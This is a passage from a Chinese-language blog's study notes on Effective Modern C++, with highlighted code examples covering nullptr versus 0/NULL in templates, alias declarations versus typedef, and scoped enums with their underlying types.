class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> result = findRecord( <span class="hljs-comment">/* arguments */</span> );<br><span class="hljs-keyword">if</span> (result == <span class="hljs-number">0</span>) &#123;<br>    …<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果你不知道<code>findRecord</code>返回了什么，那么你就不太清楚到底<code>result</code>是一个指针类型还是一个整型。但是换一种假设如果你看到这样的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> result = findRecord( <span class="hljs-comment">/* arguments */</span> );<br><br><span class="hljs-keyword">if</span> (result == <span class="hljs-literal">nullptr</span>) &#123;  <br>    …<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这就没有任何歧义：<code>result</code>的结果一定是指针类型。</p><p>再考虑下面例子：</p><p>假如你有一些函数只能被合适的已锁互斥量调用。每个函数都有一个不同类型的指针：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span>    <span class="hljs-title">f1</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; spw)</span></span>;     <span class="hljs-comment">//只能被合适的</span><br><span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">f2</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Widget&gt; upw)</span></span>;     <span class="hljs-comment">//已锁互斥量</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span>   <span class="hljs-title">f3</span><span class="hljs-params">(Widget* pw)</span></span>;                      <span class="hljs-comment">//调用</span><br></code></pre></div></td></tr></table></figure><p>如果这样传递空指针：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::mutex f1m, f2m, f3m;       <span class="hljs-comment">//用于f1，f2，f3函数的互斥量</span><br><br><span class="hljs-keyword">using</span> MuxGuard = <span class="hljs-built_in">std</span>::lock_guard&lt;<span class="hljs-built_in">std</span>::mutex&gt;;<br>…<br><br>&#123;  <br>    <span class="hljs-function">MuxGuard <span class="hljs-title">g</span><span class="hljs-params">(f1m)</span></span>;            <span class="hljs-comment">//为f1m上锁</span><br>    <span class="hljs-keyword">auto</span> result = f1(<span class="hljs-number">0</span>);        <span class="hljs-comment">//向f1传递0作为空指针</span><br>&#125;                               <span class="hljs-comment">//解锁 </span><br>…<br>&#123;  <br>    <span class="hljs-function">MuxGuard <span class="hljs-title">g</span><span class="hljs-params">(f2m)</span></span>;            <span class="hljs-comment">//为f2m上锁</span><br>    <span class="hljs-keyword">auto</span> result = f2(<span class="hljs-literal">NULL</span>);     <span class="hljs-comment">//向f2传递NULL作为空指针</span><br>&#125;                               <span class="hljs-comment">//解锁 </span><br>…<br>&#123;<br>    <span class="hljs-function">MuxGuard <span class="hljs-title">g</span><span class="hljs-params">(f3m)</span></span>;            <span class="hljs-comment">//为f3m上锁</span><br>    <span class="hljs-keyword">auto</span> result = f3(<span class="hljs-literal">nullptr</span>);  <span class="hljs-comment">//向f3传递nullptr作为空指针</span><br>&#125;                               <span class="hljs-comment">//解锁</span><br></code></pre></div></td></tr></table></figure><p>令人遗憾前两个调用没有使用<code>nullptr</code>，但是代码可以正常运行。</p><p>模板化这个调用流程：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> FuncType,<br>         <span class="hljs-keyword">typename</span> MuxType,<br>         <span class="hljs-keyword">typename</span> PtrType&gt;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">lockAndCall</span><span class="hljs-params">(FuncType func,                 </span></span><br><span class="hljs-function"><span class="hljs-params">                 MuxType&amp; mutex,                 </span></span><br>                 PtrType ptr) -&gt; decltype(func(ptr))<br>&#123;<br>    <span class="hljs-function">MuxGuard <span class="hljs-title">g</span><span class="hljs-params">(mutex)</span></span>;  <br>    <span class="hljs-keyword">return</span> func(ptr); <br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> FuncType,<br>         <span class="hljs-keyword">typename</span> MuxType,<br>         <span class="hljs-keyword">typename</span> PtrType&gt;<br><span class="hljs-function"><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>) <span class="hljs-title">lockAndCall</span><span class="hljs-params">(FuncType func,       <span class="hljs-comment">//C++14</span></span></span><br><span class="hljs-function"><span class="hljs-params">                           MuxType&amp; mutex,</span></span><br><span class="hljs-function"><span class="hljs-params">                           PtrType ptr)</span></span><br><span class="hljs-function"></span>&#123; <br>    <span class="hljs-function">MuxGuard <span class="hljs-title">g</span><span class="hljs-params">(mutex)</span></span>;  <br>    <span class="hljs-keyword">return</span> func(ptr); <br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以写这样的代码调用<code>lockAndCall</code>模板：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> result1 = lockAndCall(f1, f1m, <span class="hljs-number">0</span>);         <span class="hljs-comment">//错误！</span><br>...<br><span class="hljs-keyword">auto</span> result2 = lockAndCall(f2, f2m, <span class="hljs-literal">NULL</span>);      <span class="hljs-comment">//错误！</span><br>...<br><span class="hljs-keyword">auto</span> result3 = lockAndCall(f3, f3m, <span class="hljs-literal">nullptr</span>);   <span class="hljs-comment">//没问题</span><br></code></pre></div></td></tr></table></figure><p>代码虽然可以这样写，但是就像注释中说的，前两个情况不能通过编译。</p><p>当<code>0</code>被传递给<code>lockAndCall</code>模板，模板类型推导会尝试去推导实参类型，<code>0</code>的类型总是<code>int</code>。</p><p>这意味着<code>lockAndCall</code>中<code>func</code>会被<code>int</code>类型的实参调用，这与<code>f1</code>期待的<code>std::shared_ptr&lt;Widget&gt;</code>形参不符。把<code>int</code>类型看做<code>std::shared_ptr&lt;Widget&gt;</code>类型给<code>f1</code>自然是一个类型错误。在模板<code>lockAndCall</code>中使用<code>0</code>之所以失败是因为在模板中，传给的是<code>int</code>但实际上函数期待的是一个<code>std::shared_ptr&lt;Widget&gt;</code>。</p><p>当<code>nullptr</code>传给<code>lockAndCall</code>时，<code>ptr</code>被推导为<code>std::nullptr_t</code>。当<code>ptr</code>被传递给<code>f3</code>的时候，隐式转换使<code>std::nullptr_t</code>转换为<code>Widget*</code>，因为<code>std::nullptr_t</code>可以隐式转换为任何指针类型。</p><h3><span id="结论">结论</span></h3><ul><li>优先考虑 <code>nullptr</code></li><li>避免重载指针和整型</li></ul><h2><span id="9-优先-alias-而不是typedef">9 优先 <code>alias</code> 而不是<code>typedef</code></span></h2><p><code>typedef</code>即可：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;&gt;<br>    UPtrMapSS;<br></code></pre></div></td></tr></table></figure><p>但<code>typedef</code>是C++98的东西。</p><p>C++11也提供了一个别名声明（<em>alias declaration</em>）：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> UPtrMapSS =<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;&gt;;<br></code></pre></div></td></tr></table></figure><p>由于这里给出的<code>typedef</code>和别名声明做的都是完全一样的事情。</p><p>使用别名模板，会容易很多：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;                            <span class="hljs-comment">//MyAllocList&lt;T&gt;是</span><br><span class="hljs-keyword">using</span> MyAllocList = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">list</span>&lt;T, MyAlloc&lt;T&gt;&gt;;   <span class="hljs-comment">//std::list&lt;T, MyAlloc&lt;T&gt;&gt;</span><br>                                                <span class="hljs-comment">//的同义词</span><br><br>MyAllocList&lt;Widget&gt; lw;                         <span class="hljs-comment">//用户代码</span><br></code></pre></div></td></tr></table></figure><p>使用<code>typedef</code>，你就只能从头开始：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;                            <span class="hljs-comment">//MyAllocList&lt;T&gt;是</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MyAllocList</span> &#123;</span>                            <span class="hljs-comment">//std::list&lt;T, MyAlloc&lt;T&gt;&gt;</span><br>    <span class="hljs-keyword">typedef</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">list</span>&lt;T, MyAlloc&lt;T&gt;&gt; type;      <span class="hljs-comment">//的同义词  </span><br>&#125;;<br><br>MyAllocList&lt;Widget&gt;::type lw;                   <span class="hljs-comment">//用户代码</span><br></code></pre></div></td></tr></table></figure><p>如果你想使用在一个模板内使用<code>typedef</code>声明一个链表对象，而这个对象又使用了模板形参，你就不得不在<code>typedef</code>前面加上<code>typename</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                              <span class="hljs-comment">//Widget&lt;T&gt;含有一个</span><br><span class="hljs-keyword">private</span>:                                    <span class="hljs-comment">//MyAllocLIst&lt;T&gt;对象</span><br>    <span class="hljs-keyword">typename</span> MyAllocList&lt;T&gt;::type <span class="hljs-built_in">list</span>;     <span class="hljs-comment">//作为数据成员</span><br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>这里<code>MyAllocList&lt;T&gt;::type</code>使用了一个类型，这个类型依赖于模板参数<code>T</code>。</p><p>如果使用别名声明定义一个<code>MyAllocList</code>，就不需要使用<code>typename</code>（同时省略麻烦的“<code>::type</code>”后缀）：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt; <br><span class="hljs-keyword">using</span> MyAllocList = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">list</span>&lt;T, MyAlloc&lt;T&gt;&gt;;   <span class="hljs-comment">//同之前一样</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br><span class="hljs-keyword">private</span>:<br>    MyAllocList&lt;T&gt; <span class="hljs-built_in">list</span>;                        <span class="hljs-comment">//没有“typename”</span><br>    …                                           <span class="hljs-comment">//没有“::type”</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>C++11在<em>typetraits</em>（类型特性）中给了你一系列工具去实现类型转换，如果要使用这些模板请包含头文件<code>&lt;type_traits&gt;</code>。里面有许许多多<em>typetraits</em>，也不全是类型转换的工具，也包含一些可预测接口的工具。给一个你想施加转换的类型<code>T</code>，结果类型就是<code>std::</code>transformation<code>&lt;T&gt;::type</code>，比如：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::remove_const&lt;T&gt;::type          <span class="hljs-comment">//从const T中产出T</span><br><span class="hljs-built_in">std</span>::remove_reference&lt;T&gt;::type      <span class="hljs-comment">//从T&amp;和T&amp;&amp;中产出T</span><br><span class="hljs-built_in">std</span>::add_lvalue_reference&lt;T&gt;::type  <span class="hljs-comment">//从T中产出T&amp;</span><br></code></pre></div></td></tr></table></figure><blockquote><p>注释仅仅简单的总结了类型转换做了什么，所以不要太随便的使用。在你的项目使用它们之前，你最好看看它们的详细说明书。</p></blockquote><p>这些别名声明有一个通用形式：对于C++11的类型转换<code>std::</code>transformation<code>&lt;T&gt;::type</code>在C++14中变成了<code>std::</code>transformation<code>_t</code>。举个例子或许更容易理解：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::remove_const&lt;T&gt;::type          <span class="hljs-comment">//C++11: const T → T </span><br><span class="hljs-built_in">std</span>::<span class="hljs-keyword">remove_const_t</span>&lt;T&gt;              <span class="hljs-comment">//C++14 等价形式</span><br><br><span class="hljs-built_in">std</span>::remove_reference&lt;T&gt;::type      <span class="hljs-comment">//C++11: T&amp;/T&amp;&amp; → T </span><br><span class="hljs-built_in">std</span>::<span class="hljs-keyword">remove_reference_t</span>&lt;T&gt;          <span class="hljs-comment">//C++14 等价形式</span><br><br><span class="hljs-built_in">std</span>::add_lvalue_reference&lt;T&gt;::type  <span class="hljs-comment">//C++11: T → T&amp; </span><br><span class="hljs-built_in">std</span>::<span class="hljs-keyword">add_lvalue_reference_t</span>&lt;T&gt;      <span class="hljs-comment">//C++14 等价形式</span><br></code></pre></div></td></tr></table></figure><p>C++11的的形式在C++14中也有效。其简单实现形式是：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt; </span><br><span class="hljs-class"><span class="hljs-title">using</span> <span class="hljs-title">remove_const_t</span> = <span class="hljs-title">typename</span> <span class="hljs-title">remove_const</span>&lt;T&gt;:</span>:type;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt; </span><br><span class="hljs-class"><span class="hljs-title">using</span> <span class="hljs-title">remove_reference_t</span> = <span class="hljs-title">typename</span> <span class="hljs-title">remove_reference</span>&lt;T&gt;:</span>:type;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt; </span><br><span class="hljs-class"><span class="hljs-title">using</span> <span class="hljs-title">add_lvalue_reference_t</span> =</span><br><span class="hljs-class">  <span class="hljs-title">typename</span> <span class="hljs-title">add_lvalue_reference</span>&lt;T&gt;:</span>:type;<br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li><code>typedef</code>不支持模板化，但是别名声明支持。</li><li>别名模板避免了使用“<code>::type</code>”后缀，而且在模板中使用<code>typedef</code>还需要在前面加上<code>typename</code></li><li>C++14提供了C++11所有<em>type traits</em>转换的别名声明版本</li></ul><h2><span id="10-限域enum">10 限域`enum</span></h2><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Color</span> &#123;</span> black, white, red &#125;; <span class="hljs-comment">//black, white, red</span><br>                                        <span class="hljs-comment">//限制在Color域内</span><br><span class="hljs-keyword">auto</span> white = <span class="hljs-literal">false</span>;                     <span class="hljs-comment">//没问题，域内没有其他“white”</span><br><br>Color c = white;                        <span class="hljs-comment">//错误，域中没有枚举名叫white</span><br><br>Color c = Color::white;                 <span class="hljs-comment">//没问题</span><br><span class="hljs-keyword">auto</span> c = Color::white;                  <span class="hljs-comment">//也没问题（也符合Item5的建议）</span><br></code></pre></div></td></tr></table></figure><p>因为限域<code>enum</code>是通过“<code>enum class</code>”声明，所以它们有时候也被称为枚举类(<em><code>enum</code>classes</em>)。</p><p>使用限域<code>enum</code>来减少命名空间污染，这是一个足够合理使用它而不是它的同胞未限域<code>enum</code>的理由。</p><p>其实限域<code>enum</code>还有第二个吸引人的优点：在它的作用域中，枚举名是强类型。未限域<code>enum</code>中的枚举名会隐式转换为整型（现在，也可以转换为浮点类型）。因此下面这种歪曲语义的做法也是完全有效的：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> Color &#123; black, white, red &#125;;       <span class="hljs-comment">//未限域enum</span><br><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span>&gt;                <span class="hljs-comment">//func返回x的质因子</span><br>  primeFactors(<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> x);<br><br>Color c = red;<br>…<br><br><span class="hljs-keyword">if</span> (c &lt; <span class="hljs-number">14.5</span>) &#123;                         <span class="hljs-comment">// Color与double比较 (!)</span><br>    <span class="hljs-keyword">auto</span> factors =                      <span class="hljs-comment">// 计算一个Color的质因子(!)</span><br>      primeFactors(c);<br>    …<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在<code>enum</code>后面写一个<code>class</code>就可以将非限域<code>enum</code>转换为限域<code>enum</code>，接下来就是完全不同的故事展开了。现在不存在任何隐式转换可以将限域<code>enum</code>中的枚举名转化为任何其他类型：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Color</span> &#123;</span> black, white, red &#125;; <span class="hljs-comment">//Color现在是限域enum</span><br><br>Color c = Color::red;                   <span class="hljs-comment">//和之前一样，只是</span><br>...                                     <span class="hljs-comment">//多了一个域修饰符</span><br><br><span class="hljs-keyword">if</span> (c &lt; <span class="hljs-number">14.5</span>) &#123;                         <span class="hljs-comment">//错误！不能比较</span><br>                                        <span class="hljs-comment">//Color和double</span><br>    <span class="hljs-keyword">auto</span> factors =                      <span class="hljs-comment">//错误！不能向参数为std::size_t</span><br>      primeFactors(c);                  <span class="hljs-comment">//的函数传递Color参数</span><br>    …<br>&#125;<br><br><span class="hljs-comment">// 除非 static_cast&lt;double&gt;(c)</span><br></code></pre></div></td></tr></table></figure><p>在C++中所有的<code>enum</code>都有一个由编译器决定的整型的底层类型。对于非限域<code>enum</code>比如<code>Color</code>，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> Color &#123; black, white, red &#125;;<br></code></pre></div></td></tr></table></figure><p>编译器可能选择<code>char</code>作为底层类型，因为这里只需要表示三个值。然而，有些<code>enum</code>中的枚举值范围可能会大些，比如：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> Status &#123; good = <span class="hljs-number">0</span>,<br>              failed = <span class="hljs-number">1</span>,<br>              incomplete = <span class="hljs-number">100</span>,<br>              corrupt = <span class="hljs-number">200</span>,<br>              indeterminate = <span class="hljs-number">0xFFFFFFFF</span><br>            &#125;;<br></code></pre></div></td></tr></table></figure><p>这里值的范围从<code>0</code>到<code>0xFFFFFFFF</code>。除了在不寻常的机器上（比如一个<code>char</code>至少有32bits的那种），编译器都会选择一个比<code>char</code>大的整型类型来表示<code>Status</code>。</p><p>为了高效使用内存，编译器通常在确保能包含所有枚举值的前提下为<code>enum</code>选择一个最小的底层类型。</p><p>为此，C++98只支持<code>enum</code>定义（所有枚举名全部列出来）；<code>enum</code>声明是不被允许的。编译器才能在使用之前为每一个<code>enum</code>选择一个底层类型。</p><p>不能前置声明<code>enum</code>也是有缺点的。最大的缺点莫过于它可能增加编译依赖。系统中某个枚举类型的头文件包含在多个文件中。如果引入一个新状态值，那么可能整个系统都得重新编译。</p><p>C++11中的前置声明<code>enum</code>s可以解决这个问题。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Status</span>;</span>                  <span class="hljs-comment">//前置声明</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">continueProcessing</span><span class="hljs-params">(Status s)</span></span>;  <span class="hljs-comment">//使用前置声明enum</span><br></code></pre></div></td></tr></table></figure><p>即使<code>Status</code>的定义发生改变，包含这些声明的头文件也不需要重新编译。</p><p>默认情况下，限域枚举的底层类型是<code>int</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Status</span>;</span>                  <span class="hljs-comment">//底层类型是int</span><br></code></pre></div></td></tr></table></figure><p>如果默认的<code>int</code>不适用，你可以重写它：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Status</span>:</span> <span class="hljs-built_in">std</span>::<span class="hljs-keyword">uint32_t</span>;   <span class="hljs-comment">//Status的底层类型</span><br>                                    <span class="hljs-comment">//是std::uint32_t</span><br>                                    <span class="hljs-comment">//（需要包含 &lt;cstdint&gt;）</span><br></code></pre></div></td></tr></table></figure><p>不管怎样，编译器都知道限域<code>enum</code>中的枚举名占用多少字节。</p><p>要为非限域<code>enum</code>指定底层类型，你可以同上，结果就可以前向声明：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> Color: <span class="hljs-built_in">std</span>::<span class="hljs-keyword">uint8_t</span>;   <span class="hljs-comment">//非限域enum前向声明</span><br>                            <span class="hljs-comment">//底层类型为</span><br>                            <span class="hljs-comment">//std::uint8_t</span><br></code></pre></div></td></tr></table></figure><p>底层类型说明也可以放到<code>enum</code>定义处：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Status</span>:</span> <span class="hljs-built_in">std</span>::<span class="hljs-keyword">uint32_t</span> &#123; good = <span class="hljs-number">0</span>,<br>                                   failed = <span class="hljs-number">1</span>,<br>                                   incomplete = <span class="hljs-number">100</span>,<br>                                   corrupt = <span class="hljs-number">200</span>,<br>                                   audited = <span class="hljs-number">500</span>,<br>                                   indeterminate = <span class="hljs-number">0xFFFFFFFF</span><br>                                 &#125;;<br></code></pre></div></td></tr></table></figure><p>假设我们有一个<em>tuple</em>保存了用户的名字，email地址，声望值：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> UserInfo =                <span class="hljs-comment">//类型别名，参见Item9</span><br>    <span class="hljs-built_in">std</span>::tuple&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>,     <span class="hljs-comment">//名字</span><br>               <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>,     <span class="hljs-comment">//email地址</span><br>               <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span>&gt; ;   <span class="hljs-comment">//声望</span><br></code></pre></div></td></tr></table></figure><p>虽然注释说明了tuple各个字段对应的意思，但当你在另一文件遇到下面的代码那之前的注释就不是那么有用了：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">UserInfo 